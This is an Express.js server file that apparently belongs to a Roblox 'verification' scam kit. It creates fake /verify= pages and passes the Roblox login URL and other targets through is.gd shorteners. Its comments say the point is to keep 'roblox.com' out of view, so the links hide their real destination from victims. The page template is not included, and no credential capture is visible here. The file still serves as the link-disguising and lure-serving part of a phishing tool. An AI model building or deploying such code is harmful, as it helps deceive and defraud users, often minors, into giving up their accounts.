const express = require('express');
const path = require('path');
const fs = require('fs');
const https = require('https');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Store verification links
const verifyLinks = new Map();

// Function to create is.gd short URL
function createIsGdShortUrl(longUrl, callback) {
    const apiUrl = `https://is.gd/create.php?format=json&url=${encodeURIComponent(longUrl)}`;
    
    https.get(apiUrl, (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => {
            try {
                const json = JSON.parse(data);
                if (json.shorturl) {
                    callback(null, json.shorturl);
                } else {
                    callback(json.errormessage || 'Failed to shorten URL', null);
                }
            } catch (e) {
                callback('Invalid response from is.gd', null);
            }
        });
    }).on('error', (err) => {
        callback(err.message, null);
    });
}

// Main generator page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API to generate verification link
app.post('/api/generate', (req, res) => {
    const { url, isGdToken } = req.body;
    
    if (!url) {
        return res.status(400).json({ error: 'No URL provided', success: false });
    }
    
    // Generate 12 random digits for the verify code
    const verifyCode = Math.floor(100000000000 + Math.random() * 900000000000).toString();
    
    // Get the base URL
    const baseUrl = process.env.VERCEL_URL 
        ? `https://${process.env.VERCEL_URL}`
        : `http://localhost:${process.env.PORT || 3000}`;
    
    const generatedLink = `${baseUrl}/verify=${verifyCode}`;
    
    // Create is.gd short URL for the Roblox URL
    createIsGdShortUrl(url, (err, shortUrl) => {
        const fallbackIsGd = `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
        const robloxIsGd = shortUrl || fallbackIsGd;
        
        // Create is.gd short URL for the Roblox login page (so NO roblox.com appears!)
        const robloxLoginUrl = `https://www.roblox.com/login`;
        createIsGdShortUrl(robloxLoginUrl, (err2, loginShortUrl) => {
            const loginIsGd = loginShortUrl || `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
            
            // Create a random is.gd holder
            const isGdHolder = `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
            
            // Store all is.gd URLs
            verifyLinks.set(verifyCode, {
                originalUrl: url,
                robloxIsGd: robloxIsGd,
                loginIsGd: loginIsGd,
                isGdHolder: isGdHolder,
                verifyCode: verifyCode,
                createdAt: Date.now()
            });
            
            res.json({
                success: true,
                originalUrl: url,
                generatedUrl: generatedLink,
                verifyCode: verifyCode,
                robloxIsGd: robloxIsGd,
                loginIsGd: loginIsGd,
                isGdHolder: isGdHolder
            });
        });
    });
});

// Dynamic route for /verify=XXXXXXXXXXXX
app.get('/verify=:code', (req, res) => {
    const code = req.params.code;
    const linkData = verifyLinks.get(code);
    
    // Read the verify.html template
    const htmlPath = path.join(__dirname, 'public', 'verify.html');
    
    if (!fs.existsSync(htmlPath)) {
        return res.status(404).send('Verification page not found.');
    }
    
    let html = fs.readFileSync(htmlPath, 'utf8');
    
    // Use stored is.gd URLs or create fallbacks
    const robloxIsGd = linkData?.robloxIsGd || `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
    const loginIsGd = linkData?.loginIsGd || `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
    const isGdHolder = linkData?.isGdHolder || `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
    
    // Replace placeholders - ALL is.gd, NO roblox.com!
    html = html.replace(/\{\{VERIFY_CODE\}\}/g, code);
    html = html.replace(/\{\{ROBLOX_IS_GD\}\}/g, robloxIsGd);
    html = html.replace(/\{\{LOGIN_IS_GD\}\}/g, loginIsGd);
    html = html.replace(/\{\{IS_GD_HOLDER\}\}/g, isGdHolder);
    
    console.log(`[Server] Serving verification page for code: ${code}`);
    console.log(`[Server] Roblox page (is.gd): ${robloxIsGd}`);
    console.log(`[Server] Login page (is.gd): ${loginIsGd}`);
    console.log(`[Server] Holder (is.gd): ${isGdHolder}`);
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
});

// API to get link data
app.get('/api/link/:code', (req, res) => {
    const code = req.params.code;
    const linkData = verifyLinks.get(code);
    
    if (linkData) {
        res.json({ success: true, ...linkData });
    } else {
        res.json({ success: false, error: 'Invalid verification link' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

module.exports = app;
